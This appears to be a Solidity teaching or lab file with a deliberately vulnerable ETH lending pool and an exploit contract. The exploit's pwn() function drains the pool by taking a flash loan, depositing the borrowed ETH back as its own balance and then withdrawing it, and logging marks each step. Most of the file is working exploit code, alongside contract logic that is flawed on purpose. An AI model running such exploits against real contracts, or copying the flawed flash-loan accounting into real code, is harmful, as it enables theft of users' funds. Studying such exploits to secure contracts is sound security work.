// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "hardhat/console.sol";

contract EthLendingPool {
    mapping(address => uint) public balances;

    function deposit() external payable {
        console.log("Executing deposit from EthLendingPool contract");
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) external {
        console.log("Executing withdraw from EthLendingPool contract");
        balances[msg.sender] -= _amount;
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "send ETH failed");
    }

    function flashLoan(
        uint _amount,
        address _target,
        bytes calldata _data
    ) external {
        console.log("Executing flashLoan from EthLendingPool contract");
        uint balBefore = address(this).balance;
        console.log("EthLending pool balance before the exploit: %s", balBefore);
        require(balBefore >= _amount, "borrow amount > balance");

        (bool executed, ) = _target.call{value: _amount}(_data);
        require(executed, "loan failed");

        uint balAfter = address(this).balance;
        console.log("EthLending pool balance after the exploit: %s", balAfter);
        require(balAfter >= balBefore, "balance after < before");
        console.log("Executed flashLoan from EthLendingPool contract");
    }

    // Adding a function to get balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

interface IEthLendingPool {
    function balances(address) external view returns (uint);

    function deposit() external payable;

    function withdraw(uint _amount) external;

    function flashLoan(
        uint amount,
        address target,
        bytes calldata data
    ) external;
}

contract EthLendingPoolExploit {
    IEthLendingPool public pool;

    constructor(address _pool) {
        pool = IEthLendingPool(_pool);
    }

    // 4. receive ETH from withdraw
    receive() external payable {
        console.log("Executing receive");
        console.log("EthLending Pool Balance: %s", address(pool).balance);
        console.log("EthLending Exploit Contract Balance: %s", address(this).balance);
    }

    // 2. deposit loan into pool
    function deposit() external payable {
        console.log("Executing deposit from exploit contract");
        pool.deposit{value: msg.value}();
    }

    function pwn() external {
        uint bal = address(pool).balance;
        console.log("Executing exploit from exploit contract");
        // 1. call flash loan
        pool.flashLoan(
            bal,
            address(this),
            abi.encodeWithSignature("deposit()")
        );
        console.log("Executing withdraw from exploit contract");
        // 3. withdraw
        pool.withdraw(pool.balances(address(this)));
        console.log("Executed exploit from exploit contract");
    }

    // Adding a function to get balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
